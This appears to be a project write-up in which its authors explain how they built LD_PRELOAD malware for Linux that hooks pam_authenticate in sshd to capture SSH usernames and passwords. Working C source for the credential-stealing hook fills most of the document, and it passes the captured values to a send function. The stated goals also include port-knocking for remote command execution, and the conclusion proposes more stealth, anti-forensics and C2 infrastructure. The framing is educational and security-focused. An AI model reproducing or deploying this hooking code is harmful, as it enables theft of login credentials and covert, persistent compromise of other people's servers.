# LD_PRELOAD malware BEHINDTHESCENE

## Introduction
This document details our thought process, hypotheses, and steps taken to implement a malware using the `LD_PRELOAD` technique to extract SSH credentials (username/password). The project was conducted in an assumed breach scenario, initially with root privileges.

## Project Goals
The main objectives of this project were:
- To use `LD_PRELOAD` to hook into SSH authentication functions and extract credentials.
- To investigate and manipulate authentication processes, specifically targeting `pam_authenticate`.
- To introduce a port-knocking mechanism for remote command execution.
- To find a creative way to make a specific file unopenable.

## Thought of thoughts and Initial Exploration

### Overwriting Functions
Our first approach was to overwrite the `read()` function, as it is often used for input handling, but we quickly pivoted to a more direct method.

### Debugging and Exploration
To understand how authentication worked, we ran:
```bash
sudo /usr/sbin/sshd -D -d -e
```
This allowed us to inspect SSH behavior and pinpoint where credentials were processed.

### Investigating PAM Authentication
Given that SSH authentication uses PAM (Pluggable Authentication Module), we examined `pam_authenticate` and specifically:
```c
pamh->handlers.conf.authenticate;
```
We hypothesized that hooking into `pam_authenticate` would let us extract usernames and passwords directly.

### Testing LD_PRELOAD Hook
We created an `LD_PRELOAD` shared object to intercept function calls. Instead of using `printf`, we used `stderr` or `perror` to avoid detection (and because it was the only way to print tbh 😅🤫).

## Implementation

### Extracting Username
We implemented a function to retrieve the SSH username using `pam_get_item`:
```c
char *get_username(pam_handle_t *pamh) {
    char *username = NULL;
    if (pam_get_item(pamh, PAM_USER, (const void **)&username) == PAM_SUCCESS && username) {
//        fprintf(stderr, "USER =>>>>> %s\n", username);
    } else {
        perror("Failed to retrieve username");
    }
    return username;
}
```

### Extracting Password
For password retrieval, we hooked into `sshpam_passwd_conv`:
```c
char *get_password(pam_handle_t *pamh) {
    struct pam_conv *conv;
    if (pam_get_item(pamh, PAM_CONV, (const void **)&conv) == PAM_SUCCESS && conv) {
        const struct pam_message msg = {
            .msg_style = PAM_PROMPT_ECHO_OFF,
            .msg = "Password: "
        };
        const struct pam_message *msgp = &msg;
        struct pam_response *resp = NULL;
        int ret = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
        if (ret == PAM_SUCCESS && resp && resp->resp) {
//            fprintf(stderr, "PASSWORD =>>>>>: %s\n", resp->resp);
            char *password = strdup(resp->resp);
            free(resp->resp);
            free(resp);
            return password;
        } else {
            fprintf(stderr, "Failed to retrieve password\n");
        }
    } else {
        fprintf(stderr, "Failed to retrieve password\n");
    }
    return NULL;
}
```

### Hooking `pam_authenticate`
We replaced the original `pam_authenticate` function to intercept credentials:
```c
typedef int (*pam_authenticate_t)(pam_handle_t *, int);

int pam_authenticate(pam_handle_t *pamh, int flags) {
    static pam_authenticate_t original_pam_authenticate = NULL;
    if (!original_pam_authenticate) {
        original_pam_authenticate = (pam_authenticate_t)dlsym(RTLD_NEXT, "pam_authenticate");
        if (!original_pam_authenticate) {
//            fprintf(stderr, "Error loading original pam_authenticate: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }
    char *username = get_username(pamh);
    char *password = get_password(pamh);
    send_credentials_client(username);
    send_credentials_client(password);
    return original_pam_authenticate(pamh, flags);
}
```

## Conclusion
This project successfully demonstrated how `LD_PRELOAD` can be used to intercept and extract SSH credentials by hooking into PAM authentication functions. Future work could focus on enhancing stealth techniques, implementing more advanced anti-forensic measures, and improving the C2 infrastructure.

The project was a great way to both exercise our `C language` skills and significantly increase our knowledge of how the `Linux` OS and it's libraries simultaneously works. 

